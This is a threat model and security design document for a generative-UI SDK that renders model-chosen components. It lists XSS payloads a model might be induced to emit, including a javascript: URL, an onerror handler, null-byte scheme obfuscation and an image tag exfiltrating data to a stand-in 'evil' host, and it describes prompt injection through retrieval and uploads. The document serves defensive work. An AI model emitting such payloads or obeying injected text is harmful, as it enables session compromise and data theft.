# Security model

**Version**: 1.0 · **Date**: 2026-09-29
**See also**: [Trust boundaries diagram](./diagrams/06-trust-boundaries.md) · [ADR-0001](./adr/0001-server-side-validation-boundary.md) · [ADR-0004](./adr/0004-closed-component-vocabulary.md)

---

## 1. Why generative UI needs its own threat model

Conventional web security assumes the *developer* decides what renders. Generative
UI breaks that assumption: the structure of the page is chosen at request time by a
model that has just read retrieval context, user input and tool output — none of
which is trusted.

The XSS surface therefore moves from **"what the developer wrote"** to **"what the
model was persuaded to write"**. Input sanitisation does not address it, because the
dangerous content is not the input; it is the model's response to the input.

This document states what is defended, how, and — importantly — what is not.

---

## 2. Assets

| Asset | Why it matters |
|---|---|
| relaxAI API key | Direct financial cost and unmetered model access |
| Prompt content | May contain claims data, customer records, internal figures |
| Jurisdictional boundary | The compliance reason relaxAI was chosen at all |
| The rendered DOM | Script execution there is session compromise |
| Server availability | A generative endpoint is an expensive thing to have abused |

---

## 3. Adversaries

| Adversary | Capability |
|---|---|
| **Malicious end user** | Arbitrary request bodies; full control of their own browser and of any client-side code |
| **Content injector** | Controls text that reaches the model via retrieval, uploads or a third-party API |
| **Network observer** | Sees traffic between the application and relaxAI |
| **Curious insider** | Reads application logs and metrics |
| **Compromised dependency** | Runs code inside the server or browser bundle |

---

## 4. Controls

### 4.1 Credential handling

| Control | Implementation |
|---|---|
| Key never leaves the server | `RelaxClient` is constructed at module scope in a route handler; the React package has no code path that takes a key |
| Key absent → fail fast | Constructor throws `config_invalid` with a message telling you not to inline it client-side |
| Key never logged | `RelaxUIError.toJSON()` carries only code, status, requestId, strategy |
| Key never in an error body | HTTP error mapping copies the upstream message, not the request |

**Residual risk**: nothing stops an application putting the key in a
`NEXT_PUBLIC_` variable. The SDK cannot detect this. It is called out in the
quickstart and in `.env.example`.

### 4.2 Jurisdictional boundary (Principle I)

| Control | Implementation |
|---|---|
| Host allowlist | `assertSovereignEndpoint` runs in the `RelaxClient` **constructor**, so a misconfigured `RELAX_BASE_URL` fails the deploy rather than quietly exfiltrating prompts |
| TLS required | `http://` refused; the loopback exception requires an explicit opt-in **and** a loopback host — the opt-in cannot widen to a remote host, and there is a test asserting exactly that |
| No incidental egress | The SDK contacts only `/chat/completions` and `/models`. No telemetry, no version check, no error reporter |
| No runtime dependencies in core | Nothing else to audit on the egress path ([ADR-0003](./adr/0003-no-openai-sdk-dependency.md)) |
| Optional redaction | `redact()` is pure regex, deterministic, model-free, and reports what it matched so a deployment can alarm on it |

**Residual risk**: redaction is high-precision by design, so it under-matches
rather than mangling prose. It is a safety net, not a DLP product.

### 4.3 Model output as untrusted input (Principle IV)

This is the core of the model. Each row is a specific attack.

| Attack | Control | Where it fires |
|---|---|---|
| Emit `{"type":"script"}` | Type union closed at schema-construction time; no branch exists for an unregistered component | Server validation, then renderer again |
| Emit `{"type":"iframe","props":{"src":…}}` | Same | Same |
| Put `<img onerror=…>` in a text prop | Rendered as React text content; **no `dangerouslySetInnerHTML` exists anywhere in the SDK**, and CI greps for it | Render |
| `href: "javascript:alert(1)"` | `urlString()` is a `superRefine` + `transform`, so this fails **schema validation** — before a frame is sent | Server validation, then renderer |
| `java\0script:` / `java\tscript:` | Control characters rejected outright | URL guard |
| `data:text/html;base64,…` | Data URLs off by default; when enabled, the media type must be an allowlisted image | URL guard |
| Exfiltrate via `<img src="https://evil/?d=…">` | Optional `allowedHosts` on URL props | URL guard |
| Smuggle an event handler as a prop | `.strict()` objects: an unexpected key is a validation failure, not a silent drop | Server validation |
| 200,000-node tree (DoS) | Node and depth budgets, enforced by an **iterative** `measureTree` with a hard iteration cap | Server validation |
| Deeply nested tree to overflow the stack | The budget check is iterative *because* a recursive one overflows while measuring — the guard would fail before firing. Tested against a 200,000-deep tree | Server validation |
| Control characters in display text | `displayText()` rejects them | Server validation |

#### Why the renderer re-checks what the server already checked

The server's checks are load-bearing; the renderer's are not. They exist anyway
because a control living in exactly one layer is a control that a misconfiguration
silently removes — the realistic failure is a registry mismatched to a component
map, which is a configuration mistake, not an attack. The cost is a map lookup and
a `safeParse` per node.

### 4.4 Request-surface hardening

| Control | Implementation |
|---|---|
| Model not client-selectable | Fixed in the route's closure; the type signature makes the alternative unexpressible. Prevents cost abuse and model-shopping for a weaker safety posture |
| Schema not client-supplied | Same. A client-supplied schema is arbitrary structured extraction |
| System prompt not client-supplied | Same. A client-supplied system prompt is a jailbreak with a REST interface |
| Body validated before inference | `inputSchema.safeParse`; a failure is a 400 and costs zero tokens |
| Authorisation before inference | `authorize(request)` returning a `Response` short-circuits |
| Cancellation propagates | `request.signal` reaches relaxAI, so a closed tab stops the generation |
| Timeout ceiling | Default 120s per request |

There is a test asserting that a body containing `model` and `system` cannot
influence either.

### 4.5 Information disclosure

| Control | Implementation |
|---|---|
| Validation errors echo paths, not values | `redactIssues()` reduces issues to `{code, path}`; the route returns failing paths only. A failing value may be personal data |
| Wire frames carry no prompt or completion text | Protocol contract; `error.message` is SDK-authored |
| Metadata is log-safe | Strategy, downgrades, repair count, usage, duration — no content |
| Metrics cannot hold content | `MetricsCollector` accepts no string from the model; it counts |
| No SDK-side transport for any of it | Exporting is the application's explicit act |

### 4.6 Availability

| Control | Implementation |
|---|---|
| Document budgets | Bound parse and validation cost |
| Fail-fast on fatal issues | A wrong-typed field aborts the upstream generation rather than paying for the rest |
| Backpressure | `toSSEStream` pulls one event per `pull`, so a slow client slows the pipeline instead of buffering it |
| Bounded retries | 1 + `maxRetries`, full jitter so a fleet does not retry in lockstep |
| Bounded repairs | Default one round |
| Truncated repair echo | The model's prior output is capped at 8 KB so a runaway generation cannot blow the context |

**Residual risk**: no built-in rate limiting or quota. `authorize` is the seam;
quota policy belongs to the application.

---

## 5. What is deliberately not defended

Stated explicitly, because a security document that claims total coverage is
misleading.

| Not defended | Why |
|---|---|
| **Factual accuracy** | A schema constrains shape, not truth. A valid `Metric` can contain a fabricated number, and every control here will pass it. Mitigation is product-level: cite sources, instruct the model to say when it cannot justify a figure, keep a human in the loop for consequential figures |
| **Prompt injection changing *content*** | Injected text can change what the model says within the schema. The schema bounds the blast radius to "valid components with attacker-influenced text" — which is why the renderer treats all text as text |
| **A malicious application** | An application that registers a component rendering `dangerouslySetInnerHTML` from its own props has defeated the model. The SDK constrains the *model*, not the developer |
| **Model-side data leakage** | Whether relaxAI retains prompts is Civo's contract, not something an SDK can enforce. Redaction reduces exposure; it does not replace the contract |
| **Supply-chain compromise of Zod or React** | Out of scope. Core's zero runtime dependencies shrink the surface it contributes |
| **Client-side denial of self** | A user can make their own browser slow |

---

## 6. Verification

| Property | How it is verified |
|---|---|
| No raw-HTML sink | `grep -rn 'dangerouslySetInnerHTML' packages` — CI-enforced, must be empty |
| No `node:` import in core | `grep -rn 'from "node:' packages/core/src` — CI-enforced |
| Core has no runtime dependencies | `packages/core/package.json` has no `dependencies` key — CI-enforced |
| Every guard refuses | `guards.test.ts` (19), `ui-contract.test.ts` (15), `renderer.test.tsx` (11) assert refusals, not just acceptances |
| Depth guard survives a pathological tree | `measureTree` tested against 200,000 levels |
| Request surface is fixed | `route.test.ts` asserts smuggled `model`/`system` are ignored and `authorize` short-circuits before any upstream call |
| Sovereignty opt-in cannot widen | Test asserts `allowInsecureTransport` still refuses a remote host |

A guard tested only against valid input is not tested. Every control above has a
test that asserts the refusal path.

---

## 7. Deployment recommendations

1. Put the key in a server-only secret. Never `NEXT_PUBLIC_*`.
2. Set `allowedHosts` on URL props to the hosts you actually link to.
3. Turn `redaction` on, and alarm on `onRedaction` — a prompt that needed
   redacting means something upstream is passing data it should not.
4. Implement `authorize` with real authentication and a per-user quota.
5. Lower `maxNodes` and `maxDepth` to what your UI genuinely needs. The defaults
   (500 / 24) are generous.
6. Log `metadata` on every generation. A rising `repairAttempts` rate means the
   schema or prompt needs work; an unexpected `downgradedFrom` means a model's
   capabilities changed.
7. Review each registered component as a security boundary: it receives
   model-influenced props and decides what reaches the DOM.
